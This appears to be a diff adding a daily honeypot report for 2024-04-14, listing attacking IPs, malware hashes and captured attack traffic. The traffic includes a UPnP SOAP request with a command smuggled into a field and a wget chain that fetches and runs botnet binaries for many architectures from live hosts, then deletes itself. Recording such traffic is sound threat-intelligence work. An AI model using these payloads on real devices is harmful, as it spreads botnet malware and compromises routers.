@@ -1,0 +1,32 @@
+Top 5 IPs for 2024-04-14 :
+
+23.126.62.36
+43.153.172.6
+62.193.106.227
+189.203.88.51
+113.106.63.54
+
+Malware Download:
+
+e0830fe6073e891a127a6d725e1e008eeed5515ead315aa9d449ecabd216a7bf
+https://www.virustotal.com/gui/file/e0830fe6073e891a127a6d725e1e008eeed5515ead315aa9d449ecabd216a7bf
+0be7775f9f25be439da91248cabb9592dedb0e8be0ca182c218e9e0a222228b0
+https://www.virustotal.com/gui/file/0be7775f9f25be439da91248cabb9592dedb0e8be0ca182c218e9e0a222228b0
+1013c9e63d2499cd502ec6e4d1b599413a0902ca1676e49392ae4724267738fd
+https://www.virustotal.com/gui/file/1013c9e63d2499cd502ec6e4d1b599413a0902ca1676e49392ae4724267738fd
+
+
+Malcious Commands seen:
+
+POST /picsdesc.xml HTTP/1.1
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: /
+User-Agent: Hello-World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://42.6.139.217:33159/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
+
+wget http://14.225.219.227/vlxx.arm; chmod 777 vlxx.arm; ./vlxx.arm android\nwget http://14.225.219.227/vlxx.arm5; chmod 777 vlxx.arm5; ./vlxx.arm5 android\nwget http://14.225.219.227/vlxx.arm6; chmod 777 vlxx.arm6; ./vlxx.arm6 android\nwget http://14.225.219.227/vlxx.arm7; chmod 777 vlxx.arm7; ./vlxx.arm7 android\nwget http://14.225.219.227/vlxx.m68k; chmod 777 vlxx.m68k; ./vlxx.m68k android\nwget http://14.225.219.227/vlxx.mips; chmod 777 vlxx.mips; ./vlxx.mips android\nwget http://14.225.219.227/vlxx.mpsl; chmod 777 vlxx.mpsl; ./vlxx.mpsl android\nwget http://14.225.219.227/vlxx.ppc; chmod 777 vlxx.ppc; ./vlxx.ppc android\nwget http://14.225.219.227/vlxx.sh4; chmod 777 vlxx.sh4; ./vlxx.sh4 android\nwget http://14.225.219.227/vlxx.spc; chmod 777 vlxx.spc; ./vlxx.spc android\nwget http://14.225.219.227/vlxx.x86; chmod 777 vlxx.x86; ./vlxx.x86 android\nwget http://14.225.219.227/vlxx.x86_64; chmod 777 vlxx.x86_64; ./vlxx.x86_64 android\n\nrm $0
